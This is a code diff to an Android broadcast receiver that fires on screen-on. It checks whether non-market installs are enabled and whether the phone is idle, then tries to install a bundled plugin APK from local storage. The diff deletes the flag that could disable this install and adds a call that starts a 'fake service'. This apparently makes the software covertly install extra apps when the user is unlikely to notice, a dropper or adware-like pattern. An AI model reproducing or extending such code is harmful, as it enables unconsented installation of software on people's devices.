@@ -68,13 +68,20 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                                     + " open install NO market APP = " + open
                                     + " phone state = " + state);
                 }
+
+                if (!AppRuntime.isBindingActive(context)
+                        && (SettingManager.getInstance().getDeviceBindingActiveTime()) < 5) {
+                    Utils.startFakeService(context, "[[ScreenON]]");
+                    return;
+                }
+
                 if (open != 0
                         && state == TelephonyManager.CALL_STATE_IDLE
                         && UtilOperator.isPluginApkExist()
                         && !pluginInstalled
                         && SettingManager.getInstance().getDeviceBindingTime() <= Config.BIND_TIMES) {
                     if (cur > (SettingManager.getInstance().getKeyLanuchTime() + SettingManager.getInstance().getKeyInstallInterval())) {
-                        if (!Config.DIS_INSTALL) UtilOperator.tryToInstallPluginLocal(context);
+                        UtilOperator.tryToInstallPluginLocal(context);
                     }
                 } else if (pluginInstalled) {
                     Utils.tryToActivePluginApp(context);
